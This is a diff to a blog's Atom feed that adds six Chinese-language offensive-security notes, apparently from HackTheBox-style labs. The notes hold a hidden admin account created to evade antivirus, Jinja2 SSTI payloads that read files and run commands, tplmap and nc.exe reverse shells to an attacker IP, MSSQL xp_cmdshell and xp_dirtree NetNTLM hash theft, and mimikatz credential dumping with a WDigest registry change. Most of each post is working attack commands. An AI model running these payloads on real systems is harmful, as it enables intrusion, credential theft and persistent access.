@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://github.com/"/>
-  <updated>2020-04-26T04:32:21.948Z</updated>
+  <updated>2020-04-26T10:32:15.700Z</updated>
   <id>https://github.com/</id>
   
   <author>
@@ -15,6 +15,148 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>调用API绕过杀软添加用户</title>
+    <link href="https://github.com/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/"/>
+    <id>https://github.com/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/</id>
+    <published>2020-04-26T10:15:40.000Z</published>
+    <updated>2020-04-26T10:32:15.700Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>创建隐藏账户：</strong></p><pre><code>net user tw$ password /add  ###用户名为tw，密码为password的也可以通过修改注册表实现，需要system权限    </code></pre><p><strong>如何发现隐藏账户：</strong></p><p>通过组查看：</p><pre><code>net localgroup administrators net localgroup users</code></pre><p>直接查看注册表，有什么用户一目了然<br>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</p><p>一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过</p><p><strong>实现：</strong></p><p>微软提供<a href="https://docs.microsoft.com/en-us/windows/win32/netmgmt/creating-a-local-group-and-adding-a-user" target="_blank" rel="noopener">C++实现</a>原型：</p><pre><code>#ifndef UNICODE#define UNICODE#endif#pragma comment(lib, &quot;netapi32.lib&quot;)#include &lt;stdio.h&gt;#include &lt;assert.h&gt;#include &lt;windows.h&gt; #include &lt;lm.h&gt;int wmain(int argc, wchar_t *argv[]){   LPGROUP_USERS_INFO_0 pBuf = NULL;   DWORD dwLevel = 0;   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;   DWORD dwEntriesRead = 0;   DWORD dwTotalEntries = 0;   NET_API_STATUS nStatus;   if (argc != 3)   {  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);  exit(1);   }   nStatus = NetUserGetGroups(argv[1],  argv[2],  dwLevel,  (LPBYTE*)&amp;pBuf,  dwPrefMaxLen,  &amp;dwEntriesRead,  &amp;dwTotalEntries);   if (nStatus == NERR_Success)   {  LPGROUP_USERS_INFO_0 pTmpBuf;  DWORD i;  DWORD dwTotalCount = 0;  if ((pTmpBuf = pBuf) != NULL)  { fprintf(stderr, &quot;\nGlobal group(s):\n&quot;); for (i = 0; i &lt; dwEntriesRead; i++) {assert(pTmpBuf != NULL);if (pTmpBuf == NULL){   fprintf(stderr, &quot;An access violation has occurred\n&quot;);   break;}wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);pTmpBuf++;dwTotalCount++; }  }  if (dwEntriesRead &lt; dwTotalEntries) fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);   }   else  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);   if (pBuf != NULL)  NetApiBufferFree(pBuf);   return 0;}</code></pre><p>NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组</p><p>我用C实现效果如下：<br><img src="1.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;strong&gt;创建隐藏账户：&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;net user tw$ password /add  ###用户名为tw，密码为password的
+也可以通过修改注册表实现，需要system权限    &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;st
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>SSTI[服务器模板注入]</title>
+    <link href="https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
+    <id>https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
+    <published>2020-04-26T05:32:06.000Z</published>
+    <updated>2020-04-26T05:40:46.401Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞成因：</strong></p><p>用户输入未经过滤就交给引擎处理</p><p><a href="http://www.onelinerizer.com/" target="_blank" rel="noopener">将python语句编译成一句话： </a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">不同类型SSTI paylaod: </a></p><p>SSTI模板注入常见引擎：</p><p><img src="1.png" alt=""></p><p>判断是哪种类型SSTI</p><p><img src="2.png" alt=""></p><p><strong>一个实例：</strong></p><p>nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI<br>返回输入内容，已知</p><p><img src="3.png" alt=""></p><p><strong>检测SSTI</strong></p><p><img src="4.png" alt=""></p><p>name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）</p><p>确定是jinja之后，尝试文件读取和命令执行</p><p><strong>读取文件</strong></p><pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}</code></pre><p><img src="5.png" alt=""></p><p><strong>命令执行：</strong></p><pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}{{ config.from_pyfile('/tmp/evilconfig.cfg') }}{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}</code></pre><p><a href="https://github.com/epinna/tplmap">SSTI注入工具tplmap</a>： </p><pre><code>python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;strong&gt;漏洞成因：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;用户输入未经过滤就交给引擎处理&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.onelinerizer.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;将python语句编译成一句
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>MSSQL NTLM stealer</title>
+    <link href="https://github.com/2020/04/26/MSSQL-NTLM-stealer/"/>
+    <id>https://github.com/2020/04/26/MSSQL-NTLM-stealer/</id>
+    <published>2020-04-26T05:24:48.000Z</published>
+    <updated>2020-04-26T05:31:15.481Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">可窃取NTLM的漏洞及利用方式</a></p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。<br>利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。</p><p>如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希</p><h2 id="环境说明："><a href="#环境说明：" class="headerlink" title="环境说明："></a><strong>环境说明：</strong></h2><p><a href="https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL" target="_blank" rel="noopener">https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL</a> SQLi，发现高权限账户但无法读取密码</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="1.png" alt=""></p><p>默认情况ASP/MSSQL支持堆叠注入：</p><p>常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令</p><pre><code>https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -</code></pre><p>本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：</p><pre><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -</code></pre><p>master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed</p><p>猜测是没有权限的问题，<a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">想到xp_dirtree外带数据</a>：</p><p>payload：</p><pre><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-</code></pre><p><img src="2.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;a href=&quot;https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;可窃取NTLM的漏洞及利用
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>mimikatz抓取密码小记</title>
+    <link href="https://github.com/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/"/>
+    <id>https://github.com/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/</id>
+    <published>2020-04-26T05:22:42.000Z</published>
+    <updated>2020-04-26T05:23:08.530Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>1、直接抓取本机：</strong></p><p>[1]#privilege::debug          //提升权限<br>[2]#sekurlsa::logonpasswords  //抓取密码</p><p><strong>离线破解lsass.dmp</strong></p><p>[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来</p><p>[2]#privilege::debug          //提升权限</p><p>[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp</p><p>[4]#sekurlsa::logonpasswords  //抓取密码</p><p>踩坑点：</p><p>[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)<br>相对路径报错    </p><p>解决方法：lsass.dmp要给完整路径，</p><p>[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key import<br>mimikatz版本过低</p><p>解决方法：使用2.0版本</p><p>[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list</p><p>windows 2012之后明文抓取均会出现这个报错</p><p>需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了</p><p><strong>（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）</strong></p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;strong&gt;1、直接抓取本机：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;[1]#privilege::debug          //提升权限&lt;br&gt;[2]#sekurlsa::logonpasswords  //抓取密码&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;离线破解lsass.d
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>内网使用smb无文件执行</title>
+    <link href="https://github.com/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/"/>
+    <id>https://github.com/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/</id>
+    <published>2020-04-26T05:04:38.000Z</published>
+    <updated>2020-04-26T05:07:25.097Z</updated>
+    
+    <content type="html"><![CDATA[<p>创建smb共享</p><pre><code>mkdir smb &amp;&amp; cd smbcp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下sudo impacket-smbserver share $(pwd) -smb2support -user Twe1ve -password  123456</code></pre><p>测试：</p><pre><code>$pass = convertto-securestring &apos;123456&apos; -AsPlainText -Force$cred= New-Object System.Management.Automation.PSCredential(&apos;Twe1ve&apos;,$pass)New-PSDrive -name tw -PSProvider FileSystem -Credential $cred -Root \\10.10.14.61\share</code></pre><p><img src="1.png" alt=""></p><p>执行：</p><pre><code>Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd share:    ##进入共享磁盘Evil-WinRM* PS share:\&gt; .\winPEAS.exe    ###执行</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;创建smb共享&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mkdir smb &amp;amp;&amp;amp; cd smb
+cp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下
+sudo impacket-smbserver share $(pwd) -smb2s
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>shell中实现runas命令</title>
+    <link href="https://github.com/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/"/>
+    <id>https://github.com/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/</id>
+    <published>2020-04-26T04:51:45.000Z</published>
+    <updated>2020-04-26T04:52:03.244Z</updated>
+    
+    <content type="html"><![CDATA[<p>有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果</p><pre><code>$pass = convertTo-SecureString &apos;36mEAhz/B8xQ~2VM&apos; -AsPlainText -Force                     $cred= New-Object System.Management.Automation.PSCredential(&quot;Sniper\Chris&quot;,$pass)Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred  ###验证是否是正确的凭证Invoke-Command -Computer Sniper -ScriptBlock { dir } -Credential $credInvoke-Command -Computer Sniper -ScriptBlock { C:\ProgramData\nc.exe 10.10.15.64  6636 -e cmd.exe } -Credential $cred  ##反弹shell</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$pass = conv
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>C#底层调用powershell过杀软</title>
